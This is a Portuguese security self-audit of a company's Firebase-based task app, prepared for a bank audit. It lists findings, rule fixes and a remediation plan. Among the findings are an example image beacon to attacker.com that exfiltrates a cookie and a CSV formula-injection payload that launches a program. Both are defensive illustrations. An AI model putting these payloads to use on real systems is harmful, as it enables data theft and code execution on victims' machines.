# Security Audit — Pré Auditoria Bancária

> **Data:** 15/05/2026 · **Versão auditada:** v4.40.20 · **Auditor:** Self-audit (Claude + 4 agentes Explore + revisão manual)
>
> **Escopo:** Firestore rules, CSP/headers, secrets, Cloud Functions, XSS/DOM, PII handling, audit logs.
>
> **Total findings:** 17 (3 CRÍTICOS · 6 ALTOS · 6 MÉDIOS · 2 BAIXOS)
>
> **TL;DR:** Sistema tem boa base (pentest 2026-05-03 fechou auto-escalation, audit logs hardened, App Check ativo). Mas 3 gaps **bloqueiam audit bancário** se não resolvidos: GitHub Pages não envia security headers; várias collections com `allow read: if isAuth()` sem ownership; MS access token em sessionStorage.

---

## 🔴 CRÍTICO — bloqueia audit bancário, resolver antes

### C1. GitHub Pages não serve security headers
**Risco:** `X-Frame-Options`, HSTS, COOP/CORP, CSP-via-header (não-bypassável), `Permissions-Policy` — todos definidos no `_headers` file (formato Cloudflare/Netlify) mas **inativos** porque GitHub Pages não suporta response headers customizados. CSP atual está só em meta tag (bypassável via DevTools, F12 → Elements → editar). HSTS+preload não está ativo → primeiro request pode ser HTTP downgrade.
**Severidade auditoria bancária:** ALTÍSSIMA — bancos exigem HSTS preload + X-Frame-Options server-side.
**Fix (1-2 sprints):** Migrar pra Cloudflare Pages OU Netlify. `_headers` já está pronto (linha 1-40 do arquivo). Deploy direto, sem reescrita.

### C2. Reads + writes permissivos em collections sensíveis
**Risco:** 5 collections com `allow read: if isAuth()` sem ownership/role check — auth user lê dados de TODOS:

| Collection | Linha | Risco |
|---|---|---|
| `/users` | 54 | role/permissions/visibleSectors expostos |
| `/feedbacks` | 681 | avaliações confidenciais expostas |
| `/projects` | 72-75 | create/update/delete sem ownership |
| `/tasks` | 81-82 | **não-auth** lê tarefas done/in_progress (era pro portal calendar) |
| `/absences` | 269 | ausências de toda a empresa |

**Severidade auditoria bancária:** ALTA — princípio do menor privilégio violado.
**Fix:**
```
match /users/{uid} {
  allow read: if isAuth() && (request.auth.uid == uid || isManager() || isAdmin());
}
match /feedbacks/{id} {
  allow read: if isAuth() && (resource.data.collaboratorId == request.auth.uid
                           || resource.data.managerId == request.auth.uid
                           || isAdmin());
}
match /tasks/{tid} {
  allow read: if isAuth();   // remove o ramo não-auth
  allow update,delete: if isAuth() && (isAdmin() || resource.data.createdBy == request.auth.uid
                                                  || request.auth.uid in resource.data.assignees);
}
```

### C3. MS Access Token em sessionStorage (XSS-stealable)
**Risco:** `js/auth/auth.js` linhas 101-102, 357-358, 636-640 — Microsoft OAuth token salvo em `sessionStorage`. Qualquer XSS payload no DOM lê e exfiltra. Bancos exigem cookies HttpOnly+Secure+SameSite=Strict pra tokens.
**Fix (1 sprint):** Cloud Function `getMsToken` que retorna token via cookie HttpOnly; client não toca o token. Curto prazo: encrypt + ttl curto em sessionStorage + clear no `beforeunload`.

---

## 🟠 ALTO — corrigir antes do audit

### A1. `unsafe-inline` em script-src e style-src
**Local:** `index.html` linhas 40-41 (CSP meta) e `_headers` linha 36.
**Risco:** Anula proteção XSS — qualquer `<script>` inline ou `style=` injetado executa. Sistema tem 30+ instâncias de `innerHTML` (taskModal: 33, gaPerformance: 43, aiHub: 38).
**Fix:** Mover scripts inline pra arquivos externos (incluindo o splash de loading nas linhas 3-22 do index.html). Substituir `'unsafe-inline'` por nonce-based CSP (`'nonce-{random}'`). Tempo: 2-3 dias.

### A2. `img-src https:` wildcard
**Local:** `index.html` linha 43.
**Risco:** Permite `<img src="https://attacker.com/beacon?cookie=...">` pra exfiltração de dados.
**Fix:** Whitelist explícito: `img-src 'self' data: blob: https://pub-ad909dc0c977450a93ee5faa79c7374d.r2.dev https://primetour-images.rene-castro.workers.dev https://upload.wikimedia.org https://images.unsplash.com;`

### A3. `target="_blank"` sem `rel="noopener noreferrer"`
**Risco:** Tab opener attack — página aberta pode acessar `window.opener.location` e redirecionar pra phishing. ~10 arquivos afetados (`agentTrigger.js`, `aiPanel.js`, `help.js`, `aiHub.js`, etc.).
**Fix:** `grep -rln 'target="_blank"' js/` → adicionar `rel="noopener noreferrer"` em cada um. Tempo: 30min.

### A4. PII em `audit_logs` sem hashing
**Local:** `js/auth/audit.js` linhas 298-303.
**Risco:** `userEmail`, `userName`, `userAgent` gravados em texto puro. LGPD exige minimização — emails deveriam ser hash SHA-256 (mantém rastreio + anonimiza).
**Fix:** Hash email com `crypto.subtle.digest('SHA-256', email)` antes de gravar. Truncar UA pra família do browser (`Chrome/Edge/Safari`).

### A5. `console.log` expõe email em prod
**Local:** `js/auth/auth.js` linha 267 — `console.log('[SSO] Perfil criado:', name, email, ...)`.
**Risco:** Browsers podem enviar logs pra extensions/dev tools; LGPD/compliance pede zero PII em console prod.
**Fix:** Substituir por `console.debug` ou wrap `if (window.__DEV__)`.

### A6. `getSharePointToken` e `getR2UploadUrl` retornam credentials direto
**Local:** `functions/index.js` linhas 510, 519-528.
**Risco:** `R2_UPLOAD_TOKEN` (secret do Cloudflare R2) é retornado pro client. Comentário diz "Sprint 2 vai trocar por JWT real" — mas tá em produção. `getSharePointToken` valida `isAdmin()` mas comentário avisa "permite qualquer auth user" sem permission granular.
**Fix:** R2: gerar **presigned URL** server-side com TTL 5min (Cloudflare R2 suporta). SharePoint: criar permission `sharepoint_access` granular ou exigir `isAdmin` estrito.

---

## 🟡 MÉDIO — desejável corrigir

### M1. Sem Subresource Integrity (SRI) em scripts externos
Firebase SDK + libs CDN sem `integrity=` attribute. CDN compromise = injeção transparente.
**Fix:** Adicionar hashes SHA-384 (gerar via `openssl dgst -sha384 -binary <file> | base64`).

### M2. `connect-src` com wildcards
**Local:** `index.html` linhas 44-57 — `https://*.googleapis.com`, `https://*.firebaseio.com`, `https://*.cloudfunctions.net`.
**Risco:** Wildcards permitem domínios não-pretendidos. Banking audit pede whitelist explícito.
**Fix:** Substituir por domínios literais. `*.googleapis.com` → enumerar: `firestore.googleapis.com identitytoolkit.googleapis.com securetoken.googleapis.com oauth2.googleapis.com`.

### M3. CSV export sem escape de fórmulas (CSV injection)
**Local:** `js/pages/team.js` linhas 950-952 (e outros exports).
**Risco:** User com nome `=cmd|'/c calc'!A1` executa fórmula ao abrir no Excel.
**Fix:** Escape `"` como `""` (RFC 4180) e prefixar valores que começam com `=+-@` com `'`.

### M4. `onNotificationCreate` rate-limit falha silenciosamente
**Local:** `functions/index.js` linhas 2956-2967.
**Risco:** Quando excede 20 emails/h por user, simplesmente `return` sem logar — ataque pode gerar 20+ notifs/h sem trace pro SIEM.
**Fix:** Audit log explícito quando rate limit dispara + deadletter em collection `notifications_blocked`.

### M5. CSAT email não valida `clientEmail`
**Local:** `functions/index.js` linhas 1735-1736.
**Risco:** `survey.clientEmail` (vem do Firestore via client write) passa direto pra `sendEmailViaGraph` sem regex de validação. Email injection possível.
**Fix:** `if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) throw error;`

### M6. Hardcoded master email em function
**Local:** `functions/index.js` linha 2849 — `rene.castro@primetour.com.br` hardcoded em `onSystemFeedbackCreate`.
**Risco:** Migração de master complica; código vaza identidade pessoal.
**Fix:** `defineSecret('FEEDBACK_ADMIN_EMAIL')` no GCP Secret Manager.

---

## 🟢 BAIXO — nota de boas práticas

### B1. `js/config.js` Firebase config commitado
Firebase apiKey + projectId em código público. **Não é segredo** (Firebase docs explicitam isso), mas auditor pode questionar. Mitigação: API key restrictions no GCP Console (HTTP referrer whitelist pra `*.primetour.com.br` + `*.github.io/tarefas`).

### B2. GitHub PAT placeholder em config
`js/config.js` tem `github.token: 'SEU_GITHUB_PAT_AQUI'` — placeholder. Risco se admin acidentalmente preencher com PAT real. Mitigação: mover pra Cloud Function Secret Manager (como já feito com EmailJS).

---

## ✅ Pontos fortes (já blindados)

Pra contexto da auditoria, vale destacar o que JÁ está sólido:

- **Anti-escalação de privilégio** (`/users` rule lines 62-66): `affectedKeys().hasAny([role, isMaster, roleId, ...])` bloqueia self-update de campos sensíveis. **Pentest 2026-05-03 fechou esse vetor.**
- **Audit logs hardened** (lines 124-141): client só cria logs com `action` regex-validado (`^[a-z_]+\.[a-z_]+$`), prefixos `auth/security/lgpd/system` bloqueados → só server-side via Admin SDK.
- **App Check** (reCAPTCHA Enterprise) ativo: rejeita requests de não-app oficial (Postman/curl).
- **PII anonymization** em `js/services/anonymizer.js` é aplicado antes de chamadas LLM (email→`<EMAIL_1>`, CPF, etc.).
- **LGPD compliance**: export próprios dados (Art. 18 V) e erasure (Art. 18 VI) implementados; DPO formal (rene.castro@primetour.com.br).
- **Backups**: PITR Firestore + GCS daily snapshot, retenção 1 ano.
- **Delete protection** ativo no Firestore (bloqueia DROP acidental).
- **CSP base** definido (mesmo com fraquezas) — `default-src 'self'` + `object-src 'none'` + `base-uri 'self'`.
- **Anti-injection em /audit_logs**: regex valida tipo de action client-side.
- **`/users` self-update granular**: bloqueia 7 campos sensíveis listados.
- **Master-only operations** via Cloud Functions (LLM keys, secrets, LGPD admin).

---

## 📋 Plano de ação priorizado (3 sprints)

### Sprint 1 (esta semana) — bloqueios da audit
1. **C2**: hardening rules de `/users`, `/feedbacks`, `/projects`, `/tasks`, `/absences` — ~6h
2. **A5**: remover `console.log` com PII em auth — 15min
3. **A3**: adicionar `rel="noopener noreferrer"` em ~10 lugares — 30min
4. **A4**: hash email + truncate UA em audit logs — 1h
5. **M3, M5**: validar CSV export + CSAT email — 1h

**Estimativa Sprint 1: 1-1.5 dias.**

### Sprint 2 — hardening crítico
6. **C3**: migrar MS token pra HttpOnly cookie via Cloud Function — 4h
7. **A1**: substituir `unsafe-inline` por nonce — 1 dia
8. **A2, M2**: tighten `img-src` e `connect-src` (sem wildcards) — 2h
9. **A6**: R2 presigned URLs + SharePoint permission granular — 1 dia
10. **M4, M6**: rate-limit logging + remove hardcoded email — 30min

**Estimativa Sprint 2: 3 dias.**

### Sprint 3 — migração de host
11. **C1**: migrar GitHub Pages → Cloudflare Pages — 1-2 dias
    - `_headers` já está pronto
    - DNS update + cert renewal
    - Smoke tests + audit trail
12. **M1**: adicionar SRI em scripts externos — 2h
13. **B1**: API key restrictions no GCP Console — 30min

**Estimativa Sprint 3: 2-3 dias.**

---

## 📤 Para a apresentação à audit bancária

**Mensagem-chave:** "Sistema passou por pentest interno em 03/05/2026 que fechou 7 vetores críticos (auto-escalation, audit log injection, etc.). Esta auditoria identifica 17 findings residuais, dos quais 3 são bloqueadores (C1-C3) com fix planejado em 3 sprints. Compensações já operacionais: Firestore rules de defense-in-depth, App Check + reCAPTCHA, PII anonymization automática antes de LLMs, LGPD-compliant export/erasure, audit logs imutáveis (TTL 180d) com regex-validation de tipos."

**Anexar:**
- Este documento
- `docs/SECURITY-POLICY.md` (se existir)
- `firestore.rules` (linha 124-141 hardened, 62-66 anti-escalation)
- `_headers` file (mostra prontidão pós-Cloudflare)
- Cloud Functions secret management (`defineSecret` calls em `functions/index.js`)
